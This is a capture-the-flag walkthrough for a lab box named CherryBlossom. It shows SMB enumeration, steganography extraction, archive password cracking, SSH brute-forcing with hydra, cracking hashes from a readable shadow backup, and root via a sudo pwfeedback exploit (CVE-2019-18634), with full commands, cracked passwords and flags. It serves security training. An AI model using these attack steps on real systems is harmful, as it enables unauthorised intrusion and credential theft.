# Box Name

## CherryBlossom

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---

### NMAP 
```bash
Nmap scan report for 10.10.138.177

Host is up, received conn-refused (0.15s latency).

Scanned at 2021-06-26 15:05:56 CDT for 17s

  

PORT STATE SERVICE REASON VERSION

22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)

| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKc/7PuGrQ4Lxftvthh93ErX7zaSQc1O0jgk/tcmxe9xkcl4psN8ZzUg7ca9yVWxjyyyFQtpqoPi0nUuSRfGSsoBGFYXXipf6uZZ3FSOtgiMVnxKNliFcZ9JHVgAlhsxON/TIcClWgKY5FkjKesWNQFliYD0AG1cT8pDIWVhxIUfD9z7ZBix9otYIcAzoDl2Zn+COX1ueYYEtsm3R0CThm3cSTUdyj43fTXxGSdfE2B5VZ5whnG2dy3mwHUDQJwEdrNfadVEbn4vaMTOHJHGsj9l5MBAcUoK0d+uUI0xi49C67KeOjEXLE3qFaZ3GutNjdk3PqoQCJ9K1bJI7jrSIr

| 256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEeAGAJHeiLl1wlePWrIQHmVHJDtgIITUOAmMOHawS2XR772Sui65bkCtSqTzUHhXiKpCnSUnXs1iYDttfmhrmc=

| 256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519)

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHCtTOq99vqGAOB/7Yii6wfllmq7ml6kmEOrPeUurfX

139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

Host script results:

|_clock-skew: mean: -26m32s, deviation: 34m38s, median: -6m33s

| nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

| Names:

| UBUNTU<00> Flags: <unique><active>

| UBUNTU<03> Flags: <unique><active>

| UBUNTU<20> Flags: <unique><active>

| \x01\x02__MSBROWSE__\x02<01> Flags: <group><active>

| WORKGROUP<00> Flags: <group><active>

| WORKGROUP<1d> Flags: <unique><active>

| WORKGROUP<1e> Flags: <group><active>

| Statistics:

| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00

| p2p-conficker:

| Checking for Conficker.C or higher...

| Check 1 (port 26141/tcp): CLEAN (Couldn't connect)

| Check 2 (port 23009/tcp): CLEAN (Couldn't connect)

| Check 3 (port 60926/udp): CLEAN (Failed to receive data)

| Check 4 (port 17391/udp): CLEAN (Failed to receive data)

|_ 0/4 checks are positive: Host is CLEAN or ports are blocked

| smb-os-discovery:

| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)

| Computer name: cherryblossom

| NetBIOS computer name: UBUNTU\x00

| Domain name: \x00

| FQDN: cherryblossom

|_ System time: 2021-06-26T20:59:36+01:00

| smb-security-mode:

| account_used: guest

| authentication_level: user

| challenge_response: supported

|_ message_signing: disabled (dangerous, but default)

| smb2-security-mode:

| 2.02:

|_ Message signing enabled but not required

| smb2-time:

| date: 2021-06-26T19:59:36

|_ start_date: N/A
```

### CME on smb
```bash
└─$ cme smb 10.10.93.94 -u '' -p '' --shares      
SMB         10.10.93.94     445    UBUNTU           [*] Windows 6.1 (name:UBUNTU) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.93.94     445    UBUNTU           [+] \: 
SMB         10.10.93.94     445    UBUNTU           [+] Enumerated shares
SMB         10.10.93.94     445    UBUNTU           Share           Permissions     Remark
SMB         10.10.93.94     445    UBUNTU           -----           -----------     ------
SMB         10.10.93.94     445    UBUNTU           Anonymous       READ            Anonymous File Server Share
SMB         10.10.93.94     445    UBUNTU           IPC$                            IPC Service (Samba 4.7.6-Ubuntu)

```

### smbclient
```bash
└─$ smbclient -N  //10.10.93.94/Anonymous -c ls 
Anonymous login successful
  .                                   D        0  Sun Feb  9 18:22:51 2020
  ..                                  D        0  Sun Feb  9 11:48:18 2020
  journal.txt                         N  3470998  Sun Feb  9 18:20:53 2020

└─$ smbclient -N  //10.10.93.94/Anonymous -c ls -c "get journal.txt -"

###Snip
iVBORw0KGgoAAAANSUhEUgAABQAAAANVCAIAAACoFcTeAAEAAElEQVR42iT9V7DuW3bdh628/vHL
+9s5nRxuzt19O6Kb6G40CBJMgkALImWWaVFFPVhlyiWXXZZDWS4nSaRcdllSFUUSBgmagAmg0UAn
dO57++Zwzj1hn533/vL3zysvP/TjeJnPo8b8zTng7rW7DjgEgYMAeeigRx5ZZIEFBgLgMYAWUoyg
txYg5Lswdc4jAC3yCECtlAWAWotp6DzA3ntoauegN45I7zBFxEiNOAMKxJ4QypZeEUIAMqI2QMiQ
4wICgBzAjhD611//1YP7J5bY3/nbf/etn7/x0QcPYx5QCqE2TSkEcACpRsnK6lILA4B2wipjAMAQ
SGwIYsBbDB3SiEAbxZGQjVI2CEIpNaRuEA17nX5EqXZ+Mp+WhTFVeX33qhOiLJZ7KxvXb9xcVtOP
Prr3hpx7oK/73q88/1qdVRfHozw2k3o6Bw1mEBbaOgACCIA31ADPbrTXN1a2jRBCGGBASoI4arUp
gjAIAlIaIayotXQYcg8dJt4YihBSzBhVNY01pgG6kVnelMJ5AUQFtIGKYgapgxYzSICx1McUe4i9
gwxbWWELHGEMO4wjShAmxDhjrZcWU0wpSXFsHFTGOOcY0l4opy3CYQe11lYHPIl0k30kLpaz2Uq7
+9T+3ZvxzSRMxmIJPGh3I1gLY5xH+Ps//N5zL7zwtS/+6g9/+sNay3hr5Q9//Mcf3X/QQulv/+3f
+nv/s7/64PHj5Wz22ouf+e5b7/9X//V/83/+X/6jVhB/eHn0wsuvBLVdZnl3I/nxD378j//xP51O
amRdzPHMXzpluiAl1mtr262V8XIWx61h1LdVOehEXvtSiDDsPec2tHWTTfnR6AFg6n/7f/0/bl+5
cXZ4/NY7P71z8+a1nVvemKCTjmcjwiBnnIfRD7773X/y//wXp+cXvf76aHT6q1//3G/+ld/8oz/5
t+++/e4HHx+sD9dEPXfWe6MDzg1xSbQiAVxmc+JRQOn2cL0bxAiSiweHw+7q9d1rBx89xkjevHnb
AP9ce6csioU3OArffvB2ZoqrT9969ODB+Xi2u7nZ0wkvNYfs2trW3tbWZDIpdTPT+jy/OJhc8oQZ
JxWwACiEGOR4mRcW8pWoU9WZAFnS7hIb3trfW+n3Dh48PDs8Lqpie2d3pb9xIs/Pjs5wQBxEO2zt
5o1b+9f33n3n7fHFZRQkRqlCCEYgJxFnwUa/Bx30yrZacafTbqp6Oh43BoTt5O7qlrD+/Sf3WlH3
9rO321EceKSdhoRSHHQxj8JIIldn1Z/+7Pvvvvvx+tXN3qDjhFjt9GPnjRU/PX9S6+bLwztd2ja1
XF1dMZvt3/3Jn38n+2nAw//7/+g/f+7OUx/cf1OOs8nltCgFRrzXHWJVL+f5ZdP0W/HO1kpRqEdP
nlhgllVeGV+yPKtn42putV9L10IASQV7aQcC2KbJS68+u7Nx7U+++R0p8ihqr/YH/bXO8enxR48/
2dre2FhZZRy1cZSkrVbcKXPlhpEo1TCFUqh/9Yd/8OD4CED51LMvfvXXfu3hg8dXWps379xY21z/
02//+VuXD//Bf/QfgdqbKk9iwCzQBWyJQJ0s33vn3R9++NOfnd27vBERgGbZvMzlC8n21aDnhIEG
###snip

```

### Base64 decode journel.txt
```bash
└─$ cat journal.txt| base64 -d > outfile
└─$ file outfile 
outfile: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced

└─$ mv outfile journal.png 
```

### stegpy
#### most stego programs do not work on png file found a python script that works well
```bash
pip3 install stegpy

└─$ stegpy journal.png            
File _journal.zip succesfully extracted from journal.png
```

```bash
file _journal.zip
_journal.zip: JPEG image data
```
*** Humm this don't look right
```bash
└─$ xxd -l 50 _journal.zip
00000000: ffd8 ffd8 1400 0900 0800 3500 4a50 847d  ..........5.JP.}
00000010: 980b 3d13 0100 2213 0100 0b00 1c00 4a6f  ..=...".......Jo
00000020: 7572 6e61 6c2e 6374 7a55 5409 0003 669d  urnal.ctzUT...f.
00000030: 405e                                     @^

```
*** looks like the magic byte have been changed
	lets fix that
```bash
ORIGENAL---
00000000   FF D8 FF D8  14 00 09 00  08 00 35 00  4A 50 84 7D  ..........5.JP.}
00000010   98 0B 3D 13  01 00 22 13  01 00 0B 00  1C 00 4A 6F  ..=...".......Jo
00000020   75 72 6E 61  6C 2E 63 74  7A 55 54 09  00 03 66 9D  urnal.ctzUT...f.
00000030   40 5E F0 9D  40 5E 75 78  0B 00 01 04  E8 03 00 00  @^..@^ux........
00000040   04 E8 03 00  00 21 B1 7B  4D 77 F7 05  04 F0 11 E4  .....!.{Mw......
00000050   B9 EA AC 4C  7C 1F 70 AB  F1 03 47 39  B8 8F 63 EC  ...L|.p...G9..c.
00000060   6C AE 14 EB  12 7E B7 D6  5D 86 1F 34  52 25 34 AE  l....~..]..4R%4.
00000070   DB 99 24 A7  55 2F 76 AB  FE B0 76 21  91 38 A9 90  ..$.U/v...v!.8..
00000080   94 61 E1 00  D9 DA 96 4C  0D 8C 71 2D  5E 79 4B 48  .a.....L..q-^yKH

FIXED---
00000000   50 4B 03 04  14 00 09 00  08 00 35 00  4A 50 84 7D  PK........5.JP.}
00000010   98 0B 3D 13  01 00 22 13  01 00 0B 00  1C 00 4A 6F  ..=...".......Jo
00000020   75 72 6E 61  6C 2E 63 74  7A 55 54 09  00 03 66 9D  urnal.ctzUT...f.
00000030   40 5E F0 9D  40 5E 75 78  0B 00 01 04  E8 03 00 00  @^..@^ux........
00000040   04 E8 03 00  00 21 B1 7B  4D 77 F7 05  04 F0 11 E4  .....!.{Mw......
00000050   B9 EA AC 4C  7C 1F 70 AB  F1 03 47 39  B8 8F 63 EC  ...L|.p...G9..c.
00000060   6C AE 14 EB  12 7E B7 D6  5D 86 1F 34  52 25 34 AE  l....~..]..4R%4.
00000070   DB 99 24 A7  55 2F 76 AB  FE B0 76 21  91 38 A9 90  ..$.U/v...v!.8..
00000080   94 61 E1 00  D9 DA 96 4C  0D 8C 71 2D  5E 79 4B 48  .a.....L..q-^yKH

└─$ file _journal.zip 
_journal.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

```

### unzip file 
```bash 
└─$ unzip journal.zip 
Archive:  journal.zip
[journal.zip] Journal.ctz password
```
*** looks like we need a password
### fcrackzip

```bash 
└─$ fcrackzip -D ~/rockyou.txt journal.zip    
found id 34333231, '~/rockyou.txt' is not a zipfile ver 2.xx, skipping
aaaaaa: No such file or directory
```
*** well that didn't work  lets check the flags for fcrackzip

```
USAGE: fcrackzip
          [-b|--brute-force]            use brute force algorithm
          [-D|--dictionary]             use a dictionary
          [-B|--benchmark]              execute a small benchmark
          [-c|--charset characterset]   use characters from charset
          [-h|--help]                   show this message
          [--version]                   show the version of this program
          [-V|--validate]               sanity-check the algorithm
          [-v|--verbose]                be more verbose
          [-p|--init-password string]   use string as initial password/file
          [-l|--length min-max]         check password with length min to max
          [-u|--use-unzip]              use unzip to weed out wrong passwords
          [-m|--method num]             use method number "num" (see below)
          [-2|--modulo r/m]             only calculcate 1/m of the password
          file...                    the zipfiles to crack
```
*** lets use the -u,-D, and -p flags

```bash
└─$ fcrackzip -uDp ~/rockyou.txt journal.zip
PASSWORD FOUND!!!!: pw == september

└─$ unzip journal.zip 
Archive:  journal.zip
[journal.zip] Journal.ctz password: 
  inflating: Journal.ctz   

└─$ file Journal.ctz
Journal.ctz: 7-zip archive data, version 0.4
	   
```

```bash
└─$ john --wordlist= ~/rockyou.txt hash             
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 SSE2 4x AES])
No password hashes left to crack (see FAQ)                                                                                                                                                                                                                                          
└─$ john --show hash                            
Journal.ctz:tigerlily

```

![](Pasted%20image%2020240309143649.png)


![](Pasted%20image%2020240309143755.png)

*** download the cherry_blossom.list file under the Wordlist node

---
## Initial Foothold
---
### SSH
```bash
└─$ hydra -l lily -P files/cherry-blossom.list ssh://10.10.180.107
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-09 15:03:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task
[DATA] attacking ssh://10.10.180.107:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 9768 to do in 01:03h, 15 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 9608 to do in 01:32h, 15 active
[22][ssh] host: 10.10.180.107   login: lily   password: Mr.$un$hin3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-09 15:09:27

```

```bash
└─$ pwncat lily@10.10.180.107  
[15:10:56] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
Password: ***********
[15:11:11] 10.10.180.107:22: registered new host w/ db                                                                                                                                                                       manager.py:957
(local) pwncat$                                                                                                                                                                                                                            
(remote) lily@cherryblossom:/home/lily$ id && ls -la
uid=1002(lily) gid=1002(lily) groups=1002(lily)
total 72
drwxr-xr-x 14 lily lily 4096 Feb 22  2020 .
drwxr-xr-x  4 root root 4096 Feb  9  2020 ..
lrwxrwxrwx  1 root root    9 Feb  9  2020 .bash_history -> /dev/null
-rw-r--r--  1 lily lily  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 lily lily 3771 Apr  4  2018 .bashrc
drwx------ 11 lily lily 4096 Feb 22  2020 .cache
drwx------ 11 lily lily 4096 Feb 22  2020 .config
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Desktop
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Documents
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Downloads
drwx------  3 lily lily 4096 Feb 10  2020 .gnupg
-rw-------  1 lily lily  346 Feb 22  2020 .ICEauthority
drwx------  3 lily lily 4096 Feb 22  2020 .local
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Music
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Pictures
-rw-r--r--  1 lily lily  807 Apr  4  2018 .profile
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Public
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Templates
drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Videos
(remote) lily@cherryblossom:/home/lily$ 

```

### Interesting files
```bash
╔══════════╣ Backup files (limited 100)
-r--r--r-- 1 root shadow 1481 Feb  9  2020 /var/backups/shadow.bak

(remote) lily@cherryblossom:/dev/shm$ ls -la /var/backups
total 2000
drwxr-xr-x  2 root root      4096 Feb 10  2020 .
drwxr-xr-x 14 root root      4096 Apr 26  2018 ..
-rw-r--r--  1 root root     71680 Feb 10  2020 alternatives.tar.0
-rw-r--r--  1 root root      3338 Feb  9  2020 alternatives.tar.1.gz
-rw-r--r--  1 root root      3016 Feb  9  2020 apt.extended_states.0
-rw-r--r--  1 root root        11 Feb  9  2020 dpkg.arch.0
-rw-r--r--  1 root root        43 Feb  9  2020 dpkg.arch.1.gz
-rw-r--r--  1 root root       280 Feb  9  2020 dpkg.diversions.0
-rw-r--r--  1 root root       160 Feb  9  2020 dpkg.diversions.1.gz
-rw-r--r--  1 root root       265 Apr 26  2018 dpkg.statoverride.0
-rw-r--r--  1 root root       190 Apr 26  2018 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   1510615 Feb  9  2020 dpkg.status.0
-rw-r--r--  1 root root    402441 Feb  9  2020 dpkg.status.1.gz
-rw-------  1 root root       936 Feb  9  2020 group.bak
-rw-------  1 root shadow     771 Feb  9  2020 gshadow.bak
-rw-------  1 root root      2382 Feb  9  2020 passwd.bak
-r--r--r--  1 root shadow    1481 Feb  9  2020 shadow.bak
```
*** looks like shadow.back is world readable

```bash
(remote) lily@cherryblossom:/var/backups$ cat shadow.bak 
root:$6$l81PobKw$DE0ra9mYvNY5rO0gzuJCCXF9p08BQ8ALp5clk/E6RwSxxrw97h2Ix9O6cpVHnq1ZUw3a/OCubATvANEv9Od9F1:18301:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
uuidd:*:17647:0:99999:7:::
avahi-autoipd:*:17647:0:99999:7:::
usbmux:*:17647:0:99999:7:::
dnsmasq:*:17647:0:99999:7:::
rtkit:*:17647:0:99999:7:::
speech-dispatcher:!:17647:0:99999:7:::
whoopsie:*:17647:0:99999:7:::
kernoops:*:17647:0:99999:7:::
saned:*:17647:0:99999:7:::
pulse:*:17647:0:99999:7:::
avahi:*:17647:0:99999:7:::
colord:*:17647:0:99999:7:::
hplip:*:17647:0:99999:7:::
geoclue:*:17647:0:99999:7:::
gnome-initial-setup:*:17647:0:99999:7:::
gdm:*:17647:0:99999:7:::
johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
sshd:*:18301:0:99999:7:::
```

*** looks like we have 3 hashes
```bash 
root:$6$l81PobKw$DE0ra9mYvNY5rO0gzuJCCXF9p08BQ8ALp5clk/E6RwSxxrw97h2Ix9O6cpVHnq1ZUw3a/OCubATvANEv9Od9F1:18301:0:99999:7:::
johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::

└─$ hashcat --username -m 1800 users_hash --show
johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:##scuffleboo##
lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:Mr.$un$hin3

```

---
## Privilege Escalation

```bash 
(remote) lily@cherryblossom:/var/backups$ su johan
Password: ********** ==> ##scuffleboo##
johan@cherryblossom:~$ id
uid=1001(johan) gid=1001(johan) groups=1001(johan),1003(devs)

johan@cherryblossom:~$ ls -la
total 48
drwxr-x---  6 johan johan 4096 Feb 10  2020 .
drwxr-xr-x  4 root  root  4096 Feb  9  2020 ..
lrwxrwxrwx  1 johan johan    9 Feb  9  2020 .bash_history -> /dev/null
-rw-r--r--  1 johan johan  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 johan johan 3771 Apr  4  2018 .bashrc
drwx------ 11 johan johan 4096 Feb  9  2020 .cache
drwx------ 11 johan johan 4096 Feb  9  2020 .config
drwx------  3 johan johan 4096 Mar  9 21:47 .gnupg
-rw-------  1 johan johan  346 Feb  9  2020 .ICEauthority
drwx------  3 johan johan 4096 Feb  9  2020 .local
-rw-r--r--  1 johan johan  807 Apr  4  2018 .profile
-rw-rw-r--  1 johan johan   38 Feb 10  2020 user.txt
-rw-rw-r--  1 johan johan  180 Feb  9  2020 .wget-hsts
johan@cherryblossom:~$ cat user.txt 
THM{cb064113d54e24dc84f26b1f63bf3098}
```

*** looks like pwfeedback is enabled 
```bash
(remote) johan@cherryblossom:/home/johan$ sudo -l
[sudo] password for johan: **************

```
*** which means we can use CVE-2019-18634
	download and compile https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
	upload to victims machine
	and execute exploit
	
```bash
(remote) johan@cherryblossom:/home/johan$ 
(local) pwncat$ upload rootshell
./rootshell ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 769.6/769.6 KB • ? • 0:00:00
[16:31:59] uploaded 769.62KiB in 2.86 seconds                                                                                                                                                                                  upload.py:76
(local) pwncat$                                                                                                                                                                                                                            
(remote) johan@cherryblossom:/home/johan$ ls -la
total 800
drwxr-x---  6 johan johan   4096 Mar  9 22:32 .
drwxr-xr-x  4 root  root    4096 Feb  9  2020 ..
lrwxrwxrwx  1 johan johan      9 Feb  9  2020 .bash_history -> /dev/null
-rw-r--r--  1 johan johan    220 Apr  4  2018 .bash_logout
-rw-r--r--  1 johan johan   3771 Apr  4  2018 .bashrc
drwx------ 11 johan johan   4096 Feb  9  2020 .cache
drwx------ 11 johan johan   4096 Feb  9  2020 .config
drwx------  3 johan johan   4096 Mar  9 21:47 .gnupg
-rw-------  1 johan johan    346 Feb  9  2020 .ICEauthority
drwx------  3 johan johan   4096 Feb  9  2020 .local
-rw-r--r--  1 johan johan    807 Apr  4  2018 .profile
-rw-rw-r--  1 johan johan 769616 Mar  9 22:32 rootshell
-rw-rw-r--  1 johan johan     38 Feb 10  2020 user.txt
-rw-rw-r--  1 johan johan    180 Feb  9  2020 .wget-hsts
(remote) johan@cherryblossom:/home/johan$ chmod +x rootshell 
(remote) johan@cherryblossom:/home/johan$ ./rootshell 
[sudo] password for johan: 
Sorry, try again.
root@cherryblossom:~# id
uid=0(root) gid=0(root) groups=0(root),1001(johan),1003(devs)


root@cherryblossom:~# cat /root/root.txt
THM{d4b5e228a567288d12e301f2f0bf5be0}

```

----
